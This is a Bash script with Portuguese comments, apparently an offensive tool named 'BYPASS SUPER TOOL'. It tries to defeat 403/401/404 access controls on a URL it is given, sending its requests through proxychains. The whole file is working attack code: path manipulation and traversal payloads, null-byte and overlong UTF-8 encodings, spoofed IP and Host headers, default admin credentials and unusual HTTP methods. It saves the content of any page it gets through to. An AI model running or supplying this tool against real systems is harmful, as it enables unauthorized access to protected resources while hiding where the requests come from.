#!/bin/bash
# BYPASS SUPER TOOL - Ferramenta definitiva para bypass de 404/403/401
echo "=== BYPASS SUPER TOOL - ULTIMATE ACCESS BYPASS ==="

TARGET="$1"
MODE="${2:-full}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL> [MODE]"
    echo "Modos: path, header, method, encoding, full"
    echo "Exemplo: $0 https://example.com/admin full"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/bypass_super_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/bypass.log" ;;
        "VULN") echo "⚠️  [$timestamp] $msg" | tee -a "$TEMP_DIR/bypass.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/bypass.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/bypass.log" ;;
    esac
}

# Obter status inicial
get_initial_status() {
    log "INFO" "Obtendo status inicial do target"
    
    local initial_response=$(proxychains4 -q curl -s -I "$TARGET" --connect-timeout 15 2>/dev/null)
    local initial_status=$(echo "$initial_response" | head -1 | grep -o '[0-9]\{3\}')
    
    echo "$initial_status" > "$TEMP_DIR/initial_status.txt"
    echo "$initial_response" > "$TEMP_DIR/initial_response.txt"
    
    log "INFO" "Status inicial: HTTP $initial_status"
    
    # Se já é 200, não precisa bypass
    if [ "$initial_status" = "200" ]; then
        log "SUCCESS" "Target já acessível (HTTP 200)"
        echo "ALREADY_ACCESSIBLE" > "$TEMP_DIR/bypass_result.txt"
        return 0
    fi
    
    return 1
}

# Bypass por manipulação de path
path_bypass() {
    log "INFO" "Iniciando bypass por manipulação de path"
    
    # Extrair path do URL
    local base_url=$(echo "$TARGET" | sed 's|^\(https\?://[^/]*\).*|\1|')
    local path=$(echo "$TARGET" | sed 's|^https\?://[^/]*||')
    
    # Se não há path, usar /
    [ -z "$path" ] && path="/"
    
    log "INFO" "Base URL: $base_url"
    log "INFO" "Path original: $path"
    
    # Técnicas de bypass de path
    local path_bypasses=(
        # Trailing slash
        "$path/"
        
        # Double slash
        "$path//"
        "/$path"
        "//$path"
        
        # Dot techniques
        "$path/."
        "$path/./"
        "$path/../$path"
        "$path/../../$path"
        
        # URL encoding
        "$(echo "$path" | sed 's|/|%2f|g')"
        "$(echo "$path" | sed 's|/|%2F|g')"
        
        # Double URL encoding
        "$(echo "$path" | sed 's|/|%252f|g')"
        "$(echo "$path" | sed 's|/|%252F|g')"
        
        # Unicode encoding
        "$(echo "$path" | sed 's|/|%c0%af|g')"
        "$(echo "$path" | sed 's|/|%e0%80%af|g')"
        
        # Case variations
        "$(echo "$path" | tr '[:lower:]' '[:upper:]')"
        "$(echo "$path" | sed 's|admin|ADMIN|g')"
        "$(echo "$path" | sed 's|admin|Admin|g')"
        
        # Null byte injection
        "$path%00"
        "$path%00.html"
        "$path%00.php"
        "$path%00.jsp"
        
        # Question mark bypass
        "$path?"
        "$path?test=1"
        "$path?random=123"
        
        # Hash bypass
        "$path#"
        "$path#test"
        
        # Semicolon bypass
        "$path;"
        "$path;test"
        
        # Backslash bypass (Windows)
        "$(echo "$path" | sed 's|/|\\|g')"
        
        # Mixed case with encoding
        "$(echo "$path" | sed 's|a|%61|g')"
        "$(echo "$path" | sed 's|e|%65|g')"
        "$(echo "$path" | sed 's|i|%69|g')"
        "$(echo "$path" | sed 's|o|%6f|g')"
        "$(echo "$path" | sed 's|u|%75|g')"
        
        # Overlong UTF-8
        "$(echo "$path" | sed 's|/|%c0%2f|g')"
        "$(echo "$path" | sed 's|/|%c1%9c|g')"
        
        # IIS specific
        "$path\\"
        "$path\\\\"
        "$(echo "$path" | sed 's|/|\\|g')\\"
        
        # Apache specific
        "$path/.htaccess"
        "$path/index.html"
        "$path/index.php"
        
        # Nginx specific
        "$path/index"
        "$path/default"
        
        # Parameter pollution
        "$path?&"
        "$path?test&"
        "$path?=&="
        
        # Space encoding
        "$(echo "$path" | sed 's| |%20|g')"
        "$(echo "$path" | sed 's| |+|g')"
        "$(echo "$path" | sed 's| |%09|g')"
        
        # Tab encoding
        "$(echo "$path" | sed 's|\t|%09|g')"
        
        # Newline encoding
        "$path%0a"
        "$path%0d"
        "$path%0d%0a"
    )
    
    log "INFO" "Testando $(( ${#path_bypasses[@]} )) técnicas de bypass de path"
    
    for bypass_path in "${path_bypasses[@]}"; do
        local test_url="$base_url$bypass_path"
        
        log "INFO" "Testando: $bypass_path"
        
        local response=$(proxychains4 -q curl -s -I "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ -n "$status" ]; then
            echo "PATH:$bypass_path:$status" >> "$TEMP_DIR/path_bypass_results.txt"
            
            # Verificar se o bypass funcionou
            if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
                log "SUCCESS" "PATH BYPASS FUNCIONOU: $bypass_path -> HTTP $status"
                echo "SUCCESS:PATH:$bypass_path:$status:$test_url" >> "$TEMP_DIR/successful_bypasses.txt"
                
                # Obter conteúdo para verificar se é realmente diferente
                local content=$(proxychains4 -q curl -s "$test_url" --connect-timeout 15 2>/dev/null)
                local content_length=${#content}
                
                if [ $content_length -gt 100 ]; then
                    log "CRITICAL" "BYPASS COM CONTEÚDO: $bypass_path ($content_length chars)"
                    echo "$content" > "$TEMP_DIR/bypass_content_$(echo $bypass_path | tr '/:' '_').txt"
                fi
            fi
        fi
        
        sleep 0.5  # Evitar rate limiting
    done
}

# Bypass por manipulação de headers
header_bypass() {
    log "INFO" "Iniciando bypass por manipulação de headers"
    
    # Headers de bypass
    local bypass_headers=(
        # IP Spoofing
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Cluster-Client-IP: 127.0.0.1"
        
        # Internal network IPs
        "X-Originating-IP: 192.168.1.1"
        "X-Forwarded-For: 10.0.0.1"
        "X-Remote-IP: 172.16.0.1"
        
        # Localhost variations
        "X-Forwarded-For: localhost"
        "X-Real-IP: localhost"
        "X-Originating-IP: 0.0.0.0"
        
        # User-Agent bypass
        "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
        "User-Agent: facebookexternalhit/1.1"
        "User-Agent: Twitterbot/1.0"
        
        # Referer bypass
        "Referer: https://www.google.com/"
        "Referer: https://www.facebook.com/"
        "Referer: https://t.co/"
        "Referer: $TARGET"
        
        # Authorization bypass
        "Authorization: Basic YWRtaW46YWRtaW4="
        "Authorization: Bearer token123"
        "Authorization: Digest username=\"admin\""
        
        # Custom headers
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Proto: https"
        "X-Forwarded-Port: 443"
        "X-Forwarded-Ssl: on"
        
        # Host header injection
        "Host: localhost"
        "Host: 127.0.0.1"
        "Host: admin.localhost"
        
        # Content-Type bypass
        "Content-Type: application/json"
        "Content-Type: text/xml"
        "Content-Type: application/x-www-form-urlencoded"
        
        # Accept bypass
        "Accept: application/json"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        "Accept: */*"
        
        # Cache bypass
        "Cache-Control: no-cache"
        "Pragma: no-cache"
        "If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT"
        
        # Proxy bypass
        "Via: 1.1 localhost"
        "X-Forwarded-Server: localhost"
        "X-ProxyUser-Ip: 127.0.0.1"
        
        # Load balancer bypass
        "X-Cluster-Client-IP: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "Forwarded: for=127.0.0.1"
        
        # CDN bypass
        "CF-Connecting-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "X-Azure-ClientIP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1, 127.0.0.1"
        
        # Method override
        "X-HTTP-Method-Override: GET"
        "X-HTTP-Method: GET"
        "X-Method-Override: GET"
    )
    
    log "INFO" "Testando $(( ${#bypass_headers[@]} )) headers de bypass"
    
    for header in "${bypass_headers[@]}"; do
        log "INFO" "Testando header: $header"
        
        local response=$(proxychains4 -q curl -s -I -H "$header" "$TARGET" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ -n "$status" ]; then
            echo "HEADER:$header:$status" >> "$TEMP_DIR/header_bypass_results.txt"
            
            if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
                log "SUCCESS" "HEADER BYPASS FUNCIONOU: $header -> HTTP $status"
                echo "SUCCESS:HEADER:$header:$status" >> "$TEMP_DIR/successful_bypasses.txt"
                
                # Obter conteúdo completo
                local content=$(proxychains4 -q curl -s -H "$header" "$TARGET" --connect-timeout 15 2>/dev/null)
                local content_length=${#content}
                
                if [ $content_length -gt 100 ]; then
                    log "CRITICAL" "HEADER BYPASS COM CONTEÚDO: $header ($content_length chars)"
                    echo "$content" > "$TEMP_DIR/header_bypass_content_$(echo "$header" | tr ' :/' '_').txt"
                fi
            fi
        fi
        
        sleep 0.5
    done
}

# Bypass por métodos HTTP
method_bypass() {
    log "INFO" "Iniciando bypass por métodos HTTP"
    
    # Métodos HTTP para teste
    local http_methods=(
        "GET"
        "POST"
        "PUT"
        "DELETE"
        "PATCH"
        "HEAD"
        "OPTIONS"
        "TRACE"
        "CONNECT"
        "PROPFIND"
        "PROPPATCH"
        "MKCOL"
        "COPY"
        "MOVE"
        "LOCK"
        "UNLOCK"
        "VERSION-CONTROL"
        "REPORT"
        "CHECKOUT"
        "CHECKIN"
        "UNCHECKOUT"
        "MKWORKSPACE"
        "UPDATE"
        "LABEL"
        "MERGE"
        "BASELINE-CONTROL"
        "MKACTIVITY"
        "ORDERPATCH"
        "ACL"
        "SEARCH"
        "ARBITRARY"
    )
    
    log "INFO" "Testando $(( ${#http_methods[@]} )) métodos HTTP"
    
    for method in "${http_methods[@]}"; do
        log "INFO" "Testando método: $method"
        
        local response=$(proxychains4 -q curl -s -I -X "$method" "$TARGET" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ -n "$status" ]; then
            echo "METHOD:$method:$status" >> "$TEMP_DIR/method_bypass_results.txt"
            
            if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
                log "SUCCESS" "METHOD BYPASS FUNCIONOU: $method -> HTTP $status"
                echo "SUCCESS:METHOD:$method:$status" >> "$TEMP_DIR/successful_bypasses.txt"
                
                # Para métodos que podem ter body, obter conteúdo
                if [[ "$method" =~ ^(GET|POST|PUT|PATCH|PROPFIND|REPORT|SEARCH)$ ]]; then
                    local content=$(proxychains4 -q curl -s -X "$method" "$TARGET" --connect-timeout 15 2>/dev/null)
                    local content_length=${#content}
                    
                    if [ $content_length -gt 100 ]; then
                        log "CRITICAL" "METHOD BYPASS COM CONTEÚDO: $method ($content_length chars)"
                        echo "$content" > "$TEMP_DIR/method_bypass_content_$method.txt"
                    fi
                fi
            fi
        fi
        
        sleep 0.5
    done
}

# Bypass por encoding
encoding_bypass() {
    log "INFO" "Iniciando bypass por encoding"
    
    # Extrair path para encoding
    local path=$(echo "$TARGET" | sed 's|^https\?://[^/]*||')
    [ -z "$path" ] && path="/"
    
    local base_url=$(echo "$TARGET" | sed 's|^\(https\?://[^/]*\).*|\1|')
    
    # Técnicas de encoding
    local encoding_techniques=(
        # URL encoding variations
        "$(echo "$path" | sed 's|/|%2f|g')"
        "$(echo "$path" | sed 's|/|%2F|g')"
        "$(echo "$path" | sed 's| |%20|g')"
        "$(echo "$path" | sed 's| |+|g')"
        
        # Double URL encoding
        "$(echo "$path" | sed 's|/|%252f|g')"
        "$(echo "$path" | sed 's|/|%252F|g')"
        "$(echo "$path" | sed 's| |%2520|g')"
        
        # Unicode encoding
        "$(echo "$path" | sed 's|/|%c0%af|g')"
        "$(echo "$path" | sed 's|/|%e0%80%af|g')"
        "$(echo "$path" | sed 's|a|%c1%81|g')"
        
        # Overlong UTF-8
        "$(echo "$path" | sed 's|/|%c0%2f|g')"
        "$(echo "$path" | sed 's|/|%c1%9c|g')"
        
        # HTML entity encoding
        "$(echo "$path" | sed 's|/|&#47;|g')"
        "$(echo "$path" | sed 's|/|&#x2f;|g')"
        
        # Mixed encoding
        "$(echo "$path" | sed 's|admin|%61dmin|g')"
        "$(echo "$path" | sed 's|admin|a%64min|g')"
        "$(echo "$path" | sed 's|admin|ad%6din|g')"
        "$(echo "$path" | sed 's|admin|adm%69n|g')"
        "$(echo "$path" | sed 's|admin|admi%6e|g')"
        
        # Case + encoding
        "$(echo "$path" | sed 's|admin|ADMIN|g' | sed 's|A|%41|g')"
        "$(echo "$path" | sed 's|admin|Admin|g' | sed 's|A|%41|g')"
        
        # Null byte variations
        "$path%00"
        "$path%00.html"
        "$path%00.php"
        "$path%00.jsp"
        "$path%00.asp"
        "$path%00.aspx"
        
        # IIS specific encoding
        "$path%3f"
        "$path%2e"
        "$path%2e%2e"
        
        # Directory traversal encoding
        "$path%2e%2e%2f"
        "$path%2e%2e/"
        "$path..%2f"
        "$path../"
        
        # Parameter encoding
        "$path%3f"
        "$path%26"
        "$path%3d"
        
        # Fragment encoding
        "$path%23"
        "$path%23test"
        
        # Semicolon encoding
        "$path%3b"
        "$path%3btest"
        
        # Backslash encoding
        "$(echo "$path" | sed 's|/|%5c|g')"
        "$(echo "$path" | sed 's|/|%5C|g')"
        
        # Tab and newline encoding
        "$path%09"
        "$path%0a"
        "$path%0d"
        "$path%0d%0a"
        
        # Space variations
        "$path%20"
        "$path+"
        "$path%09"
        "$path%0b"
        "$path%0c"
    )
    
    log "INFO" "Testando $(( ${#encoding_techniques[@]} )) técnicas de encoding"
    
    for encoded_path in "${encoding_techniques[@]}"; do
        local test_url="$base_url$encoded_path"
        
        log "INFO" "Testando encoding: $encoded_path"
        
        local response=$(proxychains4 -q curl -s -I "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ -n "$status" ]; then
            echo "ENCODING:$encoded_path:$status" >> "$TEMP_DIR/encoding_bypass_results.txt"
            
            if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
                log "SUCCESS" "ENCODING BYPASS FUNCIONOU: $encoded_path -> HTTP $status"
                echo "SUCCESS:ENCODING:$encoded_path:$status:$test_url" >> "$TEMP_DIR/successful_bypasses.txt"
                
                # Obter conteúdo
                local content=$(proxychains4 -q curl -s "$test_url" --connect-timeout 15 2>/dev/null)
                local content_length=${#content}
                
                if [ $content_length -gt 100 ]; then
                    log "CRITICAL" "ENCODING BYPASS COM CONTEÚDO: $encoded_path ($content_length chars)"
                    echo "$content" > "$TEMP_DIR/encoding_bypass_content_$(echo $encoded_path | tr '/:' '_').txt"
                fi
            fi
        fi
        
        sleep 0.5
    done
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/BYPASS_SUPER_REPORT.md"
    
    cat > "$report_file" <<EOF
# BYPASS SUPER TOOL - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Obter status inicial
    local initial_status="N/A"
    [ -f "$TEMP_DIR/initial_status.txt" ] && initial_status=$(cat "$TEMP_DIR/initial_status.txt")
    
    # Contar bypasses bem-sucedidos
    local bypasses_count=0
    [ -f "$TEMP_DIR/successful_bypasses.txt" ] && bypasses_count=$(wc -l < "$TEMP_DIR/successful_bypasses.txt")
    
    echo "- **Status inicial:** HTTP $initial_status" >> "$report_file"
    echo "- **Bypasses bem-sucedidos:** $bypasses_count" >> "$report_file"
    
    # Adicionar detalhes dos bypasses
    if [ $bypasses_count -gt 0 ]; then
        echo -e "\n## 🔓 BYPASSES BEM-SUCEDIDOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/successful_bypasses.txt" >> "$report_file"
        echo '```' >> "$report_file"
        
        # Agrupar por tipo
        echo -e "\n### Por Tipo de Bypass" >> "$report_file"
        
        local path_bypasses=$(grep "^SUCCESS:PATH:" "$TEMP_DIR/successful_bypasses.txt" 2>/dev/null | wc -l)
        local header_bypasses=$(grep "^SUCCESS:HEADER:" "$TEMP_DIR/successful_bypasses.txt" 2>/dev/null | wc -l)
        local method_bypasses=$(grep "^SUCCESS:METHOD:" "$TEMP_DIR/successful_bypasses.txt" 2>/dev/null | wc -l)
        local encoding_bypasses=$(grep "^SUCCESS:ENCODING:" "$TEMP_DIR/successful_bypasses.txt" 2>/dev/null | wc -l)
        
        echo "- **Path Bypass:** $path_bypasses" >> "$report_file"
        echo "- **Header Bypass:** $header_bypasses" >> "$report_file"
        echo "- **Method Bypass:** $method_bypasses" >> "$report_file"
        echo "- **Encoding Bypass:** $encoding_bypasses" >> "$report_file"
    fi
    
    # Adicionar conteúdo obtido
    local content_files=$(ls "$TEMP_DIR"/*_content_*.txt 2>/dev/null | wc -l)
    if [ $content_files -gt 0 ]; then
        echo -e "\n## 📄 CONTEÚDO OBTIDO" >> "$report_file"
        echo "Arquivos de conteúdo gerados: $content_files" >> "$report_file"
        
        ls "$TEMP_DIR"/*_content_*.txt 2>/dev/null | while read content_file; do
            echo "- $(basename "$content_file")" >> "$report_file"
        done
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "📊 Status inicial: HTTP $initial_status"
    echo "🔓 Bypasses bem-sucedidos: $bypasses_count"
    echo "📄 Arquivos de conteúdo: $content_files"
    
    if [ $bypasses_count -gt 0 ]; then
        echo -e "\n🔥 BYPASS BEM-SUCEDIDO!"
        echo "🎯 URLs funcionais:"
        grep "SUCCESS:" "$TEMP_DIR/successful_bypasses.txt" 2>/dev/null | while IFS=: read -r status type technique http_status url; do
            [ -n "$url" ] && echo "   $url"
        done
    else
        echo -e "\n😞 Nenhum bypass funcionou"
    fi
}

# Verificar se já é acessível
if get_initial_status; then
    generate_report
    exit 0
fi

# Execução principal baseada no modo
case "$MODE" in
    "path")
        path_bypass
        ;;
    "header")
        header_bypass
        ;;
    "method")
        method_bypass
        ;;
    "encoding")
        encoding_bypass
        ;;
    "full")
        path_bypass
        header_bypass
        method_bypass
        encoding_bypass
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ BYPASS SUPER TOOL CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"